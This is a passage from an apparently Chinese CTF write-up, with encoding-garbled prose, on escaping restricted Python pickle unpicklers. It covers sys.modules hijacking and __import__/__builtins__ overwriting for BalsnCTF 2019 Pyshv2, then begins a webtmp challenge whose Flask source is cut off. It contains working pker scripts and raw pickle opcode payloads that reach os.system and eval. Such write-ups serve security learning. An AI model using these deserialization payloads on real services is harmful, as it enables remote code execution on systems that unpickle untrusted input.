&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png" alt="image-20210811211736904">&lt;/p>
&lt;p>å°†è¾“å…¥çš„å†…å®¹å…ˆè½¬ä¸ºasciiç å½¢å¼è¢«b64åŠ å¯†ï¼Œå†ååºåˆ—åŒ–å‡ºæ¥ï¼›å…¶ä¸­ç™½åå•æ˜¯sysæ¨¡å—&lt;/p>
&lt;p>ä½†æ˜¯è¿™ä¸ªsysæ¨¡å—å¹¶ä¸å®‰å…¨ï¼šsysæ¨¡å—æœ‰ä¸€ä¸ªå­—å…¸å¯¹è±¡sys.modulesï¼Œå®ƒåŒ…å«äº†è¿è¡Œæ—¶æ‰€æœ‰pyç¨‹åºæ‰€å¼•å…¥çš„æ‰€æœ‰æ¨¡å—(a cache of imported modules) ï¼Œå¦‚æœå®ƒè¢«æ”¹å˜ å¼•å…¥çš„æ¨¡å—å°±ä¼šè¢«æ”¹å˜ã€‚è€Œå®ƒä¹ŸåŒ…æ‹¬sysæœ¬èº«ï¼Œä¹Ÿå°±æ˜¯å¥—å¨ƒ&lt;code>sys.modules['sys']=sys.modules&lt;/code>ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å…ˆä»sysä¸­å¼•å…¥modules: &lt;code>import modules from sys&lt;/code>ï¼Œç„¶åå°†&lt;code>modules['sys']&lt;/code>æ”¹ä¸º&lt;code>modules['os']&lt;/code>å°±å°†æˆåŠŸå¼•å…¥osæ¨¡å—ã€‚&lt;/p>
&lt;p>ä½†æœ‰ä¸ªç¼ºé™·æ˜¯modulesä¸ºdictï¼Œéœ€è¦ç”¨&lt;code>getattr(sys.modules[module], name)&lt;/code>è¿›è¡Œå–å€¼ï¼Œä¹Ÿå°±æ˜¯å…ˆå–å‡ºmodulesä¸­çš„getå‡½æ•°ï¼Œç„¶åå†ç”¨getæ¥å–å‡ºosï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹&lt;/p>
&lt;p>pker&lt;/p>
&lt;pre tabindex="0">&lt;code>modules=GLOBAL(&amp;#39;sys&amp;#39;, &amp;#39;modules&amp;#39;)
modules[&amp;#39;sys&amp;#39;]=modules
modules_get=GLOBAL(&amp;#39;sys&amp;#39;, &amp;#39;get&amp;#39;)
os=modules_get(&amp;#39;os&amp;#39;)
modules[&amp;#39;sys&amp;#39;]=os
system=GLOBAL(&amp;#39;sys&amp;#39;, &amp;#39;system&amp;#39;)
system(&amp;#39;dir&amp;#39;)
return
&lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#34;csys\nmodules\np0\n0g0\nS&amp;#39;sys&amp;#39;\ng0\nscsys\nget\np2\n0g2\n(S&amp;#39;os&amp;#39;\ntRp3\n0g0\nS&amp;#39;sys&amp;#39;\ng3\nscsys\nsystem\np5\n0g5\n(S&amp;#39;dir&amp;#39;\ntR.&amp;#34;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­6 - [BalsnCTF 2019] Pyshv2
&lt;/h4>
&lt;/summary>
&lt;p>é¢˜ç›®ç¯å¢ƒ-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
&lt;p>&lt;code>find_class()&lt;/code>ç¨æœ‰åŒºåˆ«ï¼Œåœ¨&lt;code>getattr()&lt;/code>ä¹‹å‰å…ˆç”¨äº†&lt;code>__import__()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png" alt="image-20210811220348086">&lt;/p>
&lt;p>è¿™æ¬¡çš„ç™½åå•æ˜¯&lt;code>structs&lt;/code>ï¼Œç„¶é¹…è¿™æ˜¯ä¸ªç©ºçš„æ¨¡å— è™šæ™ƒä¸€æªã€‚ä¸è¿‡æ˜¯ç©ºçš„ä¸è¦ç´§ï¼Œç…§æ ·æœ‰å†…ç½®æ–¹æ³•ã€‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png" alt="image-20210811220801646">&lt;/p>
&lt;p>&lt;code>__builtins__&lt;/code>æ˜¯æ‰€æœ‰æ¨¡å—å…¬æœ‰çš„å­—å…¸ï¼Œè®°å½•æ‰€æœ‰çš„å†…å»ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¹&lt;code>__builtins__&lt;/code>å†…ç›¸åº”çš„é”®æ¥ä¿®æ”¹å¯¹åº”çš„å‡½æ•°ï¼Œä¸Šå›¾ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†evalæ–¹æ³•ï¼Œä½†å–å‡ºevalè¿™ä¸ªé”®å¦å¤–éœ€è¦ä¸€ä¸ªgetæ–¹æ³•æ‰èƒ½åšåˆ°ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œ&lt;code>__getattribute__&lt;/code>é­”æœ¯æ–¹æ³•å¯ä»¥è®¿é—®ä»»æ„å±æ€§ã€‚è€ŒåŒæ—¶&lt;code>__import__&lt;/code>å¹¶ä¸æ˜¯é“æ¿ä¸€å—ï¼Œå®ƒçš„å…¨éƒ¨å‚æ•°æ˜¯&lt;code>__import__(name, globals=None, locals=None, fromlist=(), level=0)&lt;/code>ï¼Œå®ƒå¯ä»¥è¢«æ›¿æ¢ï¼ˆé€šè¿‡å¯¼å…¥builtinsæ¨¡å—å¹¶èµ‹å€¼ç»™&lt;code>builtins.__import__&lt;/code>ï¼‰æ¥å¯ä»¥ä¿®æ”¹importè¯­å¥çš„è¯­ä¹‰å¹¶ä¸”ä¸ä¼šå¯¼è‡´ä»£ç é—®é¢˜ï¼Œè€Œé¢˜ç›®ä¸­é‡å†™çš„find_class()ç‰¹åœ°åœ¨getattr()ä¹‹å‰è°ƒç”¨äº†&lt;code>__import__&lt;/code>ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™ä¸ª__import__ï¼Œè®©å®ƒå˜ä¸º&lt;code>__getattribute__&lt;/code>ï¼Œè®©æˆ‘ä»¬å¼•å…¥çš„structså˜ä¸º&lt;code>structs.__getattribute__(structs).xxx&lt;/code>ã€‚&lt;/p>
&lt;p>å¯¹äºå¼•å…¥æ¨¡å—çš„æ£€æŸ¥åªä¼šå‡ºç°åœ¨b&amp;rsquo;c&amp;rsquo;æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”¨&lt;code>S&lt;/code>æ“ä½œç åŠ«æŒ&lt;code>__import__&lt;/code>æ—¶å¹¶ä¸ä¼šå¼•å‘find_class()çš„è¿‡æ»¤ã€‚&lt;/p>
&lt;p>ç„¶è€Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥getattr()=getattr()è¿™æ ·è¦†ç›–&lt;code>__import__&lt;/code>ï¼Œæˆ‘ä»¬è¿˜éœ€è¦&lt;code>__dict__&lt;/code>çš„å¸®å¿™ã€‚&lt;code>__dict__&lt;/code>æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨å¹¶å†³å®šäº†ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼Œå¦‚æœå®ƒçš„å†…å®¹è¢«æ”¹å˜ï¼Œå±æ€§ä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚&lt;/p>
&lt;p>æ‰€ä»¥æ•´åˆä¸€ä¸‹ä¸Šé¢çš„æ€è·¯ï¼šæˆ‘ä»¬å…ˆè¦å¼•å…¥åŠ©æ‰‹list&lt;code>structs.__dict__&lt;/code>ï¼Œå–å‡ºstructsç©ºæ¨¡å—çš„å†…å»ºå‡½æ•°ï¼ˆä¸€ä¸ªå¾…å–çš„dictï¼‰&lt;code>structs.__builtins__&lt;/code>å’Œæˆ‘ä»¬éœ€è¦çš„é­”æœ¯æ–¹æ³•&lt;code>structs.__getattribute__&lt;/code>ã€‚ä¹‹åä»å†…å»ºå‡½æ•°&lt;code>structs.__builtins__&lt;/code>ä¸­å°†é”®åä¸º&lt;code>__import__&lt;/code>çš„å€¼æ›¿æ¢ä¸º&lt;code>structs.__getattribute__&lt;/code>ï¼Œç„¶åå€ŸåŠ©&lt;code>__dict__&lt;/code>å°†structsçš„structså±æ€§è¦†ç›–ä¸ºä¿®æ”¹åçš„å†…å»ºå‡½æ•°ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å†æ¬¡ç”¨b&amp;rsquo;c&amp;rsquo;ä»structsä¸­å¼•å…¥getæ—¶è§¦å‘find_class()ä¸­çš„&lt;code>__import__&lt;/code>ï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨æ‰§è¡Œ&lt;code>structs.__getattribute__('structs').get&lt;/code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†getæ–¹æ³•ã€‚è€Œä¹‹å‰æˆ‘ä»¬åˆå·²ç»æ›¿æ¢äº†structså±æ€§ä¸ºå†…å»ºå‡½æ•°&lt;code>__builtins__&lt;/code>ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°çš„getæ–¹æ³•å°±å¯ä»¥ä»&lt;code>__builtins__&lt;/code>ä¸­å–å‡ºevalï¼Œæ‰§è¡Œä»£ç äº†ã€‚ä¹‹åæ‰§è¡Œä»£ç çš„éƒ¨åˆ†åŒä¸Šé¢çš„sys.modulesçš„æ€è·¯ã€‚&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__dict__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__dict__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">gtat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__getattribute__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gtat&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">__builtins__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">builtin_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builtin_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#34;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS&amp;#39;__import__&amp;#39;\ng2\nsg0\nS&amp;#39;structs&amp;#39;\ng1\nscstructs\nget\np5\n0g5\n(S&amp;#39;eval&amp;#39;\ntRp6\n0g6\n(S&amp;#39;pickle.sys.modules[&amp;#39;os&amp;#39;].system(&amp;#39;cat ../flag.txt&amp;#39;)&amp;#39;\ntR.&amp;#34;
&lt;/code>&lt;/pre>&lt;/details>
&lt;h3 id="ç¦æ­¢bræ“ä½œç ">ç¦æ­¢&lt;code>b'R'&lt;/code>æ“ä½œç &lt;/h3>
&lt;p>ä¹Ÿå°±ç›¸å½“äºä¸å¯ä»¥ç”¨&lt;code>__reduce__&lt;/code>ï¼Œæœ‰ä»¥ä¸‹å‡ ç§åº”å¯¹æ–¹æ³•ï¼ˆä»¥ä¸‹æ–¹æ³•åŒæ ·å¯ä»¥å•ç‹¬ä½¿ç”¨é¸­ï¼ï¼ï¼ï¼‰ï¼Œå˜é‡è¦†ç›–ï¼ˆæ— ç›´æ¥ä»£ç æ‰§è¡Œï¼‰æˆ–åˆ©ç”¨&lt;code>b'i'&lt;/code>ï¼Œ&lt;code>b'i'&lt;/code>ï¼Œ&lt;code>b'b'&lt;/code>è¿™äº›æ“ä½œç æ¥rceã€‚&lt;/p>
&lt;h3 id="--å˜é‡è¦†ç›–">&amp;ndash;&amp;raquo;å˜é‡è¦†ç›–&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­7 - [é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›2020] webtmp
&lt;/h4>
&lt;/summary>
&lt;p>ï¼ˆè¿™ä¸ªé¢˜æ˜¯ç¼åˆçš„[SJTU 2019]Pickle ä»¥åŠ [SJTU 2019]Pickle-Revengeçš„é¢˜ = =ã€‚é™åˆ¶äº†&lt;code>R&lt;/code>æ“ä½œç ï¼ŒåŒæ—¶é‡å†™&lt;code>find_class()&lt;/code>é™åˆ¶å¼•å…¥æ¨¡å—ä¸º&lt;code>__main__&lt;/code>ï¼Œä¸¤ä¸ªè€ƒç‚¹ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">secret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">mimetype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
